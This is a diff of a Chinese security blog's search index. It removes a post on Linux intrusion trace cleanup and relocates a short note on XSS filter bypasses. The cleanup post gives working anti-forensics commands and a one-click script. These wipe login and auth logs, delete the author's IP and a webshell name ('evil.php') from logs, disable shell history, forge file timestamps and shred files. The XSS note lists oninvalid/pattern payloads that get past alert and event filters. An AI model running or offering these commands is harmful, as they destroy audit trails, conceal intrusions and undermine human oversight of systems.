-    <content><![CDATA[<h3 id="登录痕迹清理"><a href="#登录痕迹清理" class="headerlink" title="登录痕迹清理"></a>登录痕迹清理</h3><h4 id="基本的日志结构"><a href="#基本的日志结构" class="headerlink" title="基本的日志结构"></a>基本的日志结构</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;btmp 记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;wtmp 记录所有用户的登录、注销信息，使用last命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;utmp 记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure 记录与安全相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;message 记录系统启动后的信息和错误日志</span><br></pre></td></tr></table></figure>
-
-<h4 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># lastb</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;btmp</span><br><span class="line"># last</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"># 清除用户最后一次登录时间</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;lastlog </span><br><span class="line"># 清除安全日志记录</span><br><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"># 清除系统日志记录</span><br><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"># 清除当前登录用户的信息</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;utmp </span><br></pre></td></tr></table></figure>
-
-<h4 id="删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip"><a href="#删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip" class="headerlink" title="删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip"></a>删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</h4><p><code>sed -i &#39;/自己的ip/&#39;d /var/log/messages</code></p>
-<h4 id="全局替换自己ip"><a href="#全局替换自己ip" class="headerlink" title="全局替换自己ip"></a>全局替换自己ip</h4><p><code>sed -i &#39;s/192.168.166.85/192.168.1.1/g&#39; secure</code></p>
-<p>前面是待替换ip 后面为替换后的ip</p>
-<h3 id="时间痕迹清理"><a href="#时间痕迹清理" class="headerlink" title="时间痕迹清理"></a>时间痕迹清理</h3><p><code>ls -al</code> 可以查看创建时间</p>
-<h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch -r 目标时间的文件 需要修改时间的文件</span><br><span class="line">touch -d &quot;2018-04-18 08:00:00&quot; Th1s_isnot_flag.txt</span><br><span class="line">-a ： 仅修改access time</span><br><span class="line">-c ：仅修改时间，而不建立文件</span><br><span class="line">-d ：后面可以接日期，也可以使用 --date&#x3D;&quot;日期或时间&quot;</span><br><span class="line">-m ：仅修改mtime</span><br><span class="line">-t ：后面可以接时间，格式为 [YYMMDDhhmm]</span><br></pre></td></tr></table></figure>
-
-<h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p><code>date -s 20140712 18:30:50</code> 将当前系统日期修改为2014年07月12 18:30:50</p>
-<h4 id="hwclock"><a href="#hwclock" class="headerlink" title="hwclock"></a>hwclock</h4><p><code>hwclock --hctosys</code>  # –hctosys 将系统时钟调整为与目前的硬件时钟一致。</p>
-<h3 id="操作痕迹清理"><a href="#操作痕迹清理" class="headerlink" title="操作痕迹清理"></a>操作痕迹清理</h3><h4 id="服务日志修改"><a href="#服务日志修改" class="headerlink" title="服务日志修改"></a>服务日志修改</h4><p># 使用grep -v来把我们的相关信息删除,</p>
-<p><code>cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</code></p>
-<p># 把修改过的日志覆盖到原日志文件</p>
-<p><code>cat tmp.log &gt; /var/log/nginx/access.log/</code> </p>
-<h4 id="history记录清理"><a href="#history记录清理" class="headerlink" title="history记录清理"></a>history记录清理</h4><ul>
-<li>登录ssh后不记录history</li>
-</ul>
-<p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;export HISTSIZE=0; export HISTFILESIZE=0</code></p>
-<ul>
-<li>清理 <code>~/.bash_history</code></li>
-<li><code>history -c </code></li>
-<li><code>vim /etc/profile</code> 修改 <code>HISTSIZE=0</code></li>
-</ul>
-<h4 id="文件覆写"><a href="#文件覆写" class="headerlink" title="文件覆写"></a>文件覆写</h4><ul>
-<li>单文件</li>
-</ul>
-<p><code>shred -f -u -z -v -n 8 1.txt</code></p>
-<ul>
-<li>文件夹</li>
-</ul>
-<p><code>wipe -r</code></p>
-<h3 id="隐藏ssh登录记录"><a href="#隐藏ssh登录记录" class="headerlink" title="隐藏ssh登录记录"></a>隐藏ssh登录记录</h3><p><code>ssh -T root@192.168.0.1 /bin/bash -i</code></p>
-<p><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</code></p>
-<p><code>-o UserKnownHostsFile=/dev/null</code> #这个是knowhost的信息及公钥</p>
-<p><code>-T user@host /bin/bash –i</code> #不分配伪终端但是给个bash的终端</p>
-<h3 id="一键清除脚本"><a href="#一键清除脚本" class="headerlink" title="一键清除脚本"></a>一键清除脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/bash</span></span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>痕迹清理</category>
@@ -6725,28 +6725,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>记一次XXS绕过学习</title>
-    <url>/posts/b6714d8e/</url>
-    <content><![CDATA[<p>参考原文 <a href="https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA">https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA</a></p>
-<h3 id="alert绕过"><a href="#alert绕过" class="headerlink" title="alert绕过"></a>alert绕过</h3><p>alert(1)   — &gt;    a=alert;a(1) </p>
-<br>
-
-<h3 id="事件拦截绕过"><a href="#事件拦截绕过" class="headerlink" title="事件拦截绕过"></a>事件拦截绕过</h3><p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;alert(1)&quot; /&gt; </code></p>
-<p>oninvalid事件会以正则表达式去判断pattern的值，如果输入框内的值不全等余“a” </p>
-<p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;a=alert;a(1)&quot; /&gt;</code></p>
-<br>
-
-<h3 id="disable属性绕过"><a href="#disable属性绕过" class="headerlink" title="disable属性绕过"></a>disable属性绕过</h3><p>disable=”disable”  —&gt; a=”disable=”disable”</p>
-<br>
-
-<br>
-
-<br>
-
-<p>xss 插入的 type 即是 text 又是 submit，在文本框中按回车即可触发</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">oninvalid</span>=<span class="string">a</span>=<span class="string">alert;a(1)</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">a</span>=<span class="string">&quot; disabled=&quot;</span><span class="attr">disabled</span>&quot; <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
-  </entry>
-  <entry>
     <title>记一次hw面试经历(1)</title>
     <url>/posts/40769f33/</url>
     <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
@@ -6805,6 +6783,28 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       <tags>
         <tag>面试</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>记一次XXS绕过学习</title>
+    <url>/posts/b6714d8e/</url>
+    <content><![CDATA[<p>参考原文 <a href="https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA">https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA</a></p>
+<h3 id="alert绕过"><a href="#alert绕过" class="headerlink" title="alert绕过"></a>alert绕过</h3><p>alert(1)   — &gt;    a=alert;a(1) </p>
+<br>
+
+<h3 id="事件拦截绕过"><a href="#事件拦截绕过" class="headerlink" title="事件拦截绕过"></a>事件拦截绕过</h3><p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;alert(1)&quot; /&gt; </code></p>
+<p>oninvalid事件会以正则表达式去判断pattern的值，如果输入框内的值不全等余“a” </p>
+<p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;a=alert;a(1)&quot; /&gt;</code></p>
+<br>
+
+<h3 id="disable属性绕过"><a href="#disable属性绕过" class="headerlink" title="disable属性绕过"></a>disable属性绕过</h3><p>disable=”disable”  —&gt; a=”disable=”disable”</p>
+<br>
+
+<br>
+
+<br>
+
+<p>xss 插入的 type 即是 text 又是 submit，在文本框中按回车即可触发</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">oninvalid</span>=<span class="string">a</span>=<span class="string">alert;a(1)</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">a</span>=<span class="string">&quot; disabled=&quot;</span><span class="attr">disabled</span>&quot; <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>记一次长亭安全研究员实习生面试的经历</title>
